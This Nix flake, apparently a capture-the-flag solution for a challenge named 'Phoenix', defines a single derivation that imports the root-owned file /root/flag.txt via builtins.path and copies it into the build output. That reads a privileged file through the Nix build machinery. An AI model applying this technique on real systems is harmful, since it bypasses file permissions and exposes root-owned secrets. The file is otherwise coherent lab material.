{
  description = "Phoenix";

  outputs = { self }: {
    packages.x86_64-linux.default =
      builtins.derivation {
        name = "flag";
        system = "x86_64-linux";

        builder = "/bin/sh";

        args = [
          "-c"
          "cat ${builtins.path { path = /root/flag.txt; name = \"flag.txt\"; }} > \"$out\""
        ];
      };
  };
}